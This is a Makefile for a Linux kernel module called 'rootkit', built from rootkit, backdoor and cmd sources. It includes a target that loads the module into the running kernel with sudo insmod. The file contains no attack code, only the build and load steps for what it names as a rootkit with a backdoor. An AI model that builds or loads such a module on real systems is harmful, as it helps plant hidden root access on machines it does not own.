SRCDIR := src
obj-m += rootkit.o
rootkit-y += $(SRCDIR)/rootkit.o $(SRCDIR)/backdoor.o $(SRCDIR)/cmd.o

all:
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

debug:
	$(MAKE) -DDEBUG=1 -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

load: all
	sudo insmod rootkit.ko

unload:
	sudo rmmod rootkit
